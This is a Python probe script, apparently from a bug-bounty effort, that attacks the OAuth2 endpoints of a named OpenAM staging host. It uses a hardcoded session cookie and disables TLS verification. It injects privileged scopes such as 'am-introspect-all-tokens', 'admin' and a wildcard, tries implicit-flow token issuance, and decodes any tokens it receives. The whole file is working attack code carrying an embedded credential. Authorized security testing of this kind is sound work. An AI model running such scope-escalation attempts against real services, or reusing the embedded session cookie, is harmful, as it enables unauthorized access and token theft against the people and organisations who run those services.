# -*- coding: utf-8 -*-
"""AIC 第十二轮:OAuth2 授权码流(真实 redirect_uri)+ scope 注入 + implicit 流
预期结果表:
  成立 -> 只能请求 endUserUIClient 配置的 scope;am-introspect-all-tokens 被拒;implicit 流被禁
  不成立(发现) -> 可请求任意 scope(含 am-introspect-all-tokens)/implicit 返回 token
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
COOKIE = 'amlbcookie=01; aa942d46ece12ce=tvVfNxaXuVbrr2BzbooZZTz8iTk.*AAJTSQACMDIAAlNLABxZNXdTYkVsVmxPdWdiRlZkeDc3V3doNTJ1VTg9AAR0eXBlAANDVFMAAlMxAAIwMQ..*'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                  'Cookie': COOKIE})

def flow(scope, rtype='code', extra=''):
    """一次完整授权码流尝试,返回 (结果标签, 详情)"""
    url = (BASE + '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient'
           '&response_type=%s&redirect_uri=%s&scope=%s%s' % (rtype, RU, scope, extra))
    try:
        r = S.get(url, timeout=12, verify=False, allow_redirects=False)
        loc = r.headers.get('Location', '')
        if r.status_code == 302 and 'code=' in loc:
            code = loc.split('code=')[1].split('&')[0]
            # 换 token
            r2 = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
                        data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU},
                        timeout=12, verify=False)
            j = r2.json()
            tok = j.get('access_token', '')
            # 解码 JWT payload 看 scope
            scopes = ''
            if tok:
                try:
                    import base64
                    p = tok.split('.')[1]
                    p += '=' * (-len(p) % 4)
                    scopes = json.loads(base64.urlsafe_b64decode(p)).get('scope', '')
                except Exception:
                    scopes = '?'
            return ('CODE+TOKEN', 'code=%s.. scopes=%s' % (code[:20], scopes))
        if r.status_code == 302 and 'id_token=' in loc:
            return ('IMPLICIT', 'id_token fragment len=%d' % len(loc))
        if r.status_code == 302:
            return ('302', loc[:120])
        if r.status_code == 200:
            return ('200', r.text[:80].replace('\n', ' '))
        return (str(r.status_code), r.text[:120].replace('\n', ' '))
    except Exception as e:
        return ('ERR', str(e)[:80])

print('=== 1. 基线:标准 scope ===')
print(flow('openid fr:iga:*'))
print(flow('openid fr:idm:*'))

print('\n=== 2. scope 注入测试 ===')
print(flow('openid am-introspect-all-tokens'))
print(flow('openid fr:iga:* am-introspect-all-tokens'))
print(flow('am-introspect-all-tokens'))
print(flow('openid fr:idm:* fr:iga:* admin'))
print(flow('openid *'))

print('\n=== 3. implicit 流 ===')
print(flow('openid fr:iga:*', rtype='token id_token'))
print(flow('openid', rtype='token'))

print('\n=== 4. response_type=code 无 scope ===')
print(flow(''))
